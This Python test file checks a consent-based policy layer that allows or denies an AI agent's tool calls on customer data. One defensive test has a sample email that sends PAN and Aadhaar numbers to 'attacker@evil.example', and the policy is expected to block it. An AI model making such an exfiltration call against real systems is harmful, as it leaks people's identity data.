import json
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from tests.conftest import NOW, make_call, make_ctx
from trishul.contracts.calls import ToolCall
from trishul.contracts.decisions import Decision
from trishul.contracts.labels import Label, Level, Tag
from trishul.domains.pii import label_pii
from trishul.domains.purposelock import (
    ConsentRegistry,
    DecisionCache,
    audit_event,
    consent_epoch,
    label_response,
    minimize,
    purposelock_facts,
    strip_agent_purpose,
)
from trishul.policy.compiler import compile_files
from trishul.policy.evaluator import evaluate
from trishul.store.db import connect, iso, reset

POLICIES = Path(__file__).resolve().parents[2] / "policies"
DEMO = datetime(2026, 9, 30, 9, 0, tzinfo=UTC)
ALICE = "rajesh.kumar@example.com"  # C-1042, consent: order_support


@pytest.fixture
def conn(tmp_path: Path) -> Iterator[object]:
    c = connect(tmp_path / "t.db")
    reset(c)
    yield c
    c.close()


def read_call(customer: str = "C-1042") -> ToolCall:
    return make_call("read_customer_data", {"customer_id": customer, "fields": ["name"]})


def email_call(to: str, body: str) -> ToolCall:
    args = {"to": to, "subject": "Update", "body": body}
    labels = {f"/{k}": Label.make(Level.TRUSTED_USER, tags=label_pii(v)) for k, v in args.items()}
    return make_call("send_email", args, labels)


def facts(conn: object, call: ToolCall, purpose: str | None, now: datetime = DEMO):  # type: ignore[no-untyped-def]
    return purposelock_facts(call, purpose, conn, now)  # type: ignore[arg-type]


def test_allowed_purpose(conn) -> None:  # type: ignore[no-untyped-def]
    assert facts(conn, read_call(), "order_support") == {
        "consent_active": True,
        "sink_allowed_for_purpose": True,
    }


@pytest.mark.acceptance(9)
def test_disallowed_purpose(conn) -> None:  # type: ignore[no-untyped-def]
    f = facts(conn, read_call(), "marketing")  # C-1042 only consented to order_support
    assert f["consent_active"] is False and f["sink_allowed_for_purpose"] is False
    # consent exists for another purpose only
    assert facts(conn, read_call("C-1231"), "order_support")["consent_active"] is False
    assert facts(conn, read_call("C-9999"), "order_support")["consent_active"] is False


def test_unknown_purpose_is_unknown_fact(conn) -> None:  # type: ignore[no-untyped-def]
    assert facts(conn, read_call(), None) == {
        "consent_active": None,
        "sink_allowed_for_purpose": None,
    }


@pytest.mark.acceptance(9)
def test_agent_supplied_purpose_is_ignored() -> None:
    args = {"customer_id": "C-1042", "purpose": "marketing", "Purpose": "x"}
    clean, ignored = strip_agent_purpose(args)
    assert ignored is True and clean == {"customer_id": "C-1042"}
    same, ignored2 = strip_agent_purpose({"customer_id": "C-1042"})
    assert ignored2 is False and same == {"customer_id": "C-1042"}


def test_agent_purpose_cannot_change_facts(conn) -> None:  # type: ignore[no-untyped-def]
    clean, _ = strip_agent_purpose({"customer_id": "C-1042", "purpose": "order_support"})
    call = make_call("read_customer_data", clean)
    assert facts(conn, call, "marketing")["consent_active"] is False  # task purpose wins


def test_expiry(conn) -> None:  # type: ignore[no-untyped-def]
    call = read_call()
    assert facts(conn, call, "order_support", datetime(2027, 12, 30, 23, 59, tzinfo=UTC))[
        "consent_active"
    ]
    assert not facts(conn, call, "order_support", datetime(2027, 12, 31, tzinfo=UTC))[
        "consent_active"
    ]


def test_already_withdrawn_seed(conn) -> None:  # type: ignore[no-untyped-def]
    assert facts(conn, read_call("C-1502"), "marketing")["consent_active"] is False


def test_withdrawal_bumps_epoch_and_invalidates_cache(conn) -> None:  # type: ignore[no-untyped-def]
    reg = ConsentRegistry(conn, lambda: DEMO + timedelta(hours=1))  # type: ignore[arg-type]
    cache = DecisionCache(conn)  # type: ignore[arg-type]
    call = read_call()
    assert cache.facts(call, "order_support", DEMO)["consent_active"] is True
    assert cache.facts(call, "order_support", DEMO)["consent_active"] is True
    assert (cache.hits, cache.misses) == (1, 1)
    before = consent_epoch(conn)  # type: ignore[arg-type]
    record = reg.withdraw("cn_0104200001")
    assert record.withdrawn_at == iso(DEMO + timedelta(hours=1))
    assert consent_epoch(conn) == before + 1  # type: ignore[arg-type]
    # very next decision reflects the withdrawal, not the cached True
    assert cache.facts(call, "order_support", DEMO)["consent_active"] is False
    assert cache.misses == 2
    # withdrawal is idempotent for the timestamp but still bumps the epoch
    again = reg.withdraw("cn_0104200001")
    assert again.withdrawn_at == record.withdrawn_at
    with pytest.raises(KeyError):
        reg.withdraw("nope")


def test_cache_respects_expiry_and_clock(conn) -> None:  # type: ignore[no-untyped-def]
    cache = DecisionCache(conn)  # type: ignore[arg-type]
    call = read_call()
    assert cache.facts(call, "order_support", DEMO)["consent_active"] is True
    late = datetime(2028, 1, 1, tzinfo=UTC)
    assert cache.facts(call, "order_support", late)["consent_active"] is False


def test_registry_get_list(conn) -> None:  # type: ignore[no-untyped-def]
    reg = ConsentRegistry(conn)  # type: ignore[arg-type]
    rec = reg.get("cn_0160000006")
    assert rec is not None and rec.purposes == ("order_support", "payment_processing")
    assert reg.get("missing") is None
    assert [c.consent_id for c in reg.list("C-1042")] == ["cn_0104200001"]
    assert len(reg.list()) == 6


def test_field_minimisation() -> None:
    rec = {
        "id": "C-1042", "name": "R", "email": "e@x.com", "pan": "ABCPS5678K",
        "aadhaar": "234567890124", "order_status": "completed", "city": "B",
    }  # fmt: skip
    kept, removed = minimize("order_support", rec)
    assert set(kept) == {"id", "name", "email", "order_status", "city"}
    assert removed == ["aadhaar", "pan"]
    assert minimize("unknown_purpose", rec)[0] == {}  # fail closed
    assert minimize(None, rec)[1] == sorted(rec)


def test_response_label_preserves_pii() -> None:
    rec = {"id": "C-1", "email": "a@b.example", "aadhaar": "234567890124", "note": "x"}
    label = label_response(rec)
    assert label.level == Level.TRUSTED_SYSTEM
    assert {Tag.PII, Tag.PII_EMAIL, Tag.PII_AADHAAR} <= label.tags
    # field-name mapping tags values that do not match a recognizer
    assert Tag.PII_PHONE in label_response({"phone": "12345"}).tags
    assert label_response({"note": "hello"}).tags == frozenset()
    assert Tag.HEALTH in label_response({"x": 1}, extra_tags=[Tag.HEALTH]).tags


@pytest.fixture(scope="module")
def policy():  # type: ignore[no-untyped-def]
    return compile_files([POLICIES / "purposelock.yaml"])


def eval_with(policy, conn, call: ToolCall, purpose: str | None):  # type: ignore[no-untyped-def]
    f = purposelock_facts(call, purpose, conn, DEMO)
    return evaluate(policy, call, make_ctx(purpose=purpose, facts=f))


def test_pii_to_email_sink_blocked_via_policy(policy, conn) -> None:  # type: ignore[no-untyped-def]
    body = "Customer PAN ABCPS5678K, Aadhaar 234567890124"
    v = eval_with(policy, conn, email_call("attacker@evil.example", body), "order_support")
    assert v.decision == Decision.DENY
    assert [r.rule_id for r in v.reasons] == ["PURPOSELOCK.EGRESS.PII_WITHOUT_CONSENT"]
    # marketing purpose: no sink allowed even to the data subject's own address
    v2 = eval_with(policy, conn, email_call(ALICE, body), "marketing")
    assert v2.decision == Decision.DENY
    # unknown purpose -> unknown facts -> still denied
    assert eval_with(policy, conn, email_call(ALICE, body), None).decision == Decision.DENY


def test_pii_to_own_address_allowed_then_withdrawal_denies(policy, conn) -> None:  # type: ignore[no-untyped-def]
    call = email_call(ALICE, "Your order is completed.")
    assert eval_with(policy, conn, call, "order_support").decision == Decision.ALLOW
    ConsentRegistry(conn, lambda: DEMO).withdraw("cn_0104200001")  # type: ignore[arg-type]
    assert eval_with(policy, conn, call, "order_support").decision == Decision.DENY


def test_non_pii_email_allowed(policy, conn) -> None:  # type: ignore[no-untyped-def]
    args = {"to": "team", "subject": "s", "body": "meeting at 5"}
    call = make_call("send_email", args)
    assert eval_with(policy, conn, call, "order_support").decision == Decision.ALLOW


def test_read_without_consent_denied(policy, conn) -> None:  # type: ignore[no-untyped-def]
    assert eval_with(policy, conn, read_call(), "order_support").decision == Decision.ALLOW
    v = eval_with(policy, conn, read_call("C-1502"), "marketing")
    assert v.decision == Decision.DENY
    assert v.reasons[0].rule_id == "PURPOSELOCK.CONSENT.READ_WITHOUT_CONSENT"
    assert eval_with(policy, conn, read_call("C-1231"), "order_support").decision == Decision.DENY


def test_export_records_always_denied(policy, conn) -> None:  # type: ignore[no-untyped-def]
    call = make_call("export_records", {"customer_ids": ["C-1042"], "destination": "s3://x"})
    v = eval_with(policy, conn, call, "order_support")
    assert v.decision == Decision.DENY
    assert v.reasons[0].rule_id == "PURPOSELOCK.EGRESS.EXPORT_WITHOUT_CONSENT"


def test_read_inbox_declared(policy) -> None:  # type: ignore[no-untyped-def]
    assert "read_inbox" in policy.tools
    assert evaluate(policy, make_call("read_inbox", {}), make_ctx()).decision == Decision.ALLOW


def test_audit_event_shape() -> None:
    ev = audit_event(read_call(), "order_support", {"consent_active": True}, "ALLOW", ["b", "a"])
    assert ev["domain"] == "purposelock" and ev["reasons"] == ["a", "b"]
    assert "C-1042" not in json.dumps({k: v for k, v in ev.items() if k != "principal"})
    assert NOW  # keep import used
